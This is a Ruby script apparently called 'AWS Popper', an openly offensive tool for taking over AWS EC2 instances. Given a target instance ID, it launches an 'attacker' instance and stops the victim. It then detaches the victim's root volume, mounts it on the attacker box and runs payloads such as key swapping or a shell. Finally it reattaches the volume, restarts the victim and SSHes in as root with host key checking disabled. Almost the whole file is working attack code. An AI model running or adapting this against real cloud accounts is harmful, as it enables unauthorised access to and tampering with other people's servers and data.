require 'aws-sdk'
require 'artii'
require 'colorize'
require 'highline/import'
require 'net/ssh'

client = Aws::EC2::Client.new

# ASCII art is fun
ascii = `artii "AWS Popper" --font slant` 

puts ascii.white
puts "https://github.com/mike-bailey".yellow

# Optionally list the instances so you can, uh, pop them
enum = ask "Enumerate Instances? [y/N]: "
if enum == "y"
	instancelist = client.describe_instances()
	instancelist.each { |c| c.reservations.each { |d| d.instances.each { |f| 
		puts "#{f.instance_id} #{f.state.name} #{f.public_ip_address} #{f.instance_type} Arch: #{f.architecture}  Key Name: #{f.key_name}"
	}}}

end

instance = ask "Instance ID: "

# Generate key
# TODO: Actually use this to make popaws
`cat /dev/zero | ssh-keygen -q -N ""`

# Upload popaws to AWS so the attacker instance can use it as SSH management
keypair = client.import_key_pair({
  key_name: "AWSPOP#{instance}", 
  public_key_material: File.read("#{Dir.pwd}/popaws.pub"), 
})
target = client.describe_instances({
		instance_ids: ["#{instance}"]
	})

# Get AZ location
targetaz = target.reservations[0].instances[0].placement.availability_zone
# Get public IP address
targetip = target.reservations[0].instances[0].public_ip_address

# Run attacker instance
attacker = client.run_instances({
	  image_id: "ami-2d39803a", 
	  instance_type: "t2.micro",
	  min_count: 1, 
	  max_count: 1, 
	  key_name: "AWSPOP#{instance}",
	  placement: {
	  	availability_zone: targetaz,
	  },
	  network_interfaces: [ {
	  	device_index: 0,
	  	associate_public_ip_address: true,
	  } ]
	})
attackid = attacker.instances[0].instance_id
sleep(20)

# Get instance context
attackstuff = client.describe_instances({
		instance_ids: ["#{attackid}"]
	})
# Get network address of instance
attackip = attackstuff.reservations[0].instances[0].public_ip_address
puts "Attacking from #{attackip}"

# Stop the victim ID
resp = client.stop_instances({ 
		instance_ids: ["#{instance}"]
 })
puts "Sleeping instance..."
sleep(90)

# Identified instance volume ID
primaryvol = target.reservations[0].instances[0].block_device_mappings[0].ebs.volume_id

# Detach this instance volume
resp = client.detach_volume({
		volume_id: primaryvol,
		instance_id: instance
	})

# Pause while it's detaching
puts "Sleeping volume..."
sleep(30)

# Attach it to the attacker
takevol = client.attach_volume({
	  volume_id: primaryvol, # required
	  instance_id: attackid, # required
	  device: "/dev/sdx",
	})

# Display payload and allow execution of it
puts "Valid Payloads:\nLinux Keyswap\nHD Shell\nWindows Shelling"
payload = ask "Payload to Execute: "
if payload == "Linux Keyswap"
	`#{Dir.pwd}/keyswap.sh #{attackip}`
elsif payload == "HD Shell"
	`ssh  -i #{Dir.pwd}/popaws -o StrictHostKeyChecking=no ubuntu@#{attackip}`
elsif payload == "Windows Shelling"
	`#{Dir.pwd}/winshell.sh #{attackip}`
end

# End active attack and switch to cleanup phase
puts "Ending attack in 200sec"
sleep(200)

# Terminate the attacker instance
resp = client.terminate_instances({ 
		instance_ids: ["#{attackid}"]
 })
puts "Sleeping attacker box..."

# Remove target EBS volume from attacker
sleep(90)
resp = client.detach_volume({
		volume_id: primaryvol,
		instance_id: attackid
})

puts "Sleeping volume..."
sleep(60)
# Give original victim back his EBS volume
takevol = client.attach_volume({
	  volume_id: primaryvol, # required
	  instance_id: instance, # required
	  device: "/dev/sda1",
})

# Clean up
resp = client.delete_key_pair({
  key_name: "AWSPOP#{instance}", 
})

resp = client.start_instances({
  instance_ids: ["#{instance}"] 
})
sleep(60)

# Refresh target IP idk if this is needed tbh
target = client.describe_instances({
		instance_ids: ["#{instance}"]
	})
targetip = target.reservations[0].instances[0].public_ip_address

`ssh #{targetip} -i #{Dir.pwd}/popaws -o StrictHostKeyChecking=no root@#{targetip}`
`ssh #{targetip} -i #{Dir.pwd}/popaws -o StrictHostKeyChecking=no ubuntu@#{targetip}`

